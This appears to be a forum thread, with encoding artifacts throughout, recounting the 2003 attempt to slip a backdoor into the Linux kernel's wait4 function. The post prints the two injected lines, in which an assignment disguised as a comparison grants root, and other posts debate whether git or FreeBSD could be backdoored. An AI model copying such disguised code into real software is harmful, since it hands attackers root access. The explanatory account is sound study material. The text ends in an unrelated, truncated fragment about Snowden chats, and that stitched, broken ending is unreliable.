As for those who want to read the source to find bugs =85
Back in 2003 Linux used a system called BitKeeper to store the master copy =
of the Linux source code. If a developer wanted to propose a modification t=
o the Linux code, they would submit their proposed change, and it would go =
through an organized approval process to decide whether the change would be=
 accepted into the master code. Every change to the master code would come =
with a short explanation, which always included a pointer to the record of =
its approval.
But some people didn=92t like BitKeeper, so a second copy of the source cod=
e was kept so that developers could get the code via another code system ca=
lled CVS. The CVS copy of the code was a direct clone of the primary BitKee=
per copy.
But on Nov. 5, 2003, Larry McVoy noticed that there was a code change in th=
e CVS copy that did not have a pointer to a record of approval. Investigati=
on showed that the change had never been approved and, stranger yet, that t=
his change did not appear in the primary BitKeeper repository at all. Furth=
er investigation determined that someone had apparently broken in (electron=
ically) to the CVS server and inserted this change.
What did the change do? This is where it gets really interesting. The chang=
e modified the code of a Linux function called wait4, which a program could=
 use to wait for something to happen. Specifically, it added these two line=
s of code:
if ((options =3D=3D (__WCLONE|__WALL)) && (current->uid =3D 0))
        retval =3D -EINVAL;
[Exercise for readers who know the C programming language: What is unusual =
about this code? Answer appears below.]
A casual reading by anyone less than expert would interpret this as innocuo=
us error-checking code to make wait4 return an error code when wait4 was ca=
lled in a certain way that was forbidden by the documentation. But a really=
 careful (and somewhat) expert reader would notice that, near the end of th=
e first line, it said =93=3D 0=94 rather than =93=3D=3D 0=94. The normal th=
ing to write in code like this is =93=3D=3D 0=94, which tests whether the u=
ser ID of the currently running code (current->uid) is equal to zero, witho=
ut modifying the user ID. But what actually appears is =93=3D 0=94, which h=
as the effect of setting the user ID to zero.
Setting the user ID to zero is a problem because user ID number zero is the=
 =93root=94 user, which is allowed to do absolutely anything it wants=97to =
access all data, change the behavior of all code, and to compromise entirel=
y the security of all parts of the system. So the effect of this code is to=
 give root privileges to any piece of software that called wait4 in a parti=
cular way that is supposed to be invalid. In other words =85 it=92s a class=
ic backdoor.
This is a very clever piece of work. It looks like innocuous error checking=
, but it=92s really a back door. And it was slipped into the code outside t=
he normal approval process, to avoid any possibility that the approval proc=
ess would notice what was up.
Could this have been an NSA attack? Maybe. But there were many others who h=
ad the skill and motivation to carry out this attack. Unless somebody confe=
sses, or a smoking-gun document turns up, we=92ll never know.
We still dont have a report on the kernel.org hack of 2011.  Why not?
Many people say, "calm down, its git they can=92t have inserted backdoors e=
tc without messing up the git history/changelog/hashes/whatever". But what =
if git was modified and backdoored previously to hide some objects/changes?=
 How would such an attack work? Lets say you discover a problem in git, whi=
ch allows you to omit changesets in its output. How would that work to back=
door the kernel?
Older versions of git would tell you the hashes were wrong. Implementations=
 of git in other languages would tell you the hashes were wrong. Manually c=
hecking would tell you the hashes were wrong. It's just not feasible.   Plu=
s, git is stored in git, so you'd need to backdoor git first... ;)
Also, the source of git would also reveal a problem when examined. To get a=
round that one starts hypothesizing the sort of globe-spanning conspiracy a=
gainst which one might as well give up ("well, maybe all my compilers (not =
just gcc, all of them) are also backdoored to backdoor themselves, and each=
 other if you cross-compile, then backdoor git too...=94).
pfSense is based on FreeBSD.  What if FreeBSD was backdoored by the NSA or =
other?   How would you know?
See?  just useless ego stroking, and a lot of resultant heat, rather than s=
olutions to problems.
Can we get back to pfSense now?

ArsTechnica published IRC chats where he railed against a New York Times st=

said in the chat.
"they're just reporting, dude," said another user.
"moreover, who the fuck are the anonymous sources telling them this?" he sa=

Snowden, in the chat, also criticized reporting on classified information:
"is it unethical to report on the government's intrigue?" asked a user in t=

"VIOLATING NATIONAL SECURITY? no." he responded.
"meh. national security." responded the user.
"Um, YEEEEEEEEEEEES.that shit is classified for a reason," he said. "it's n=
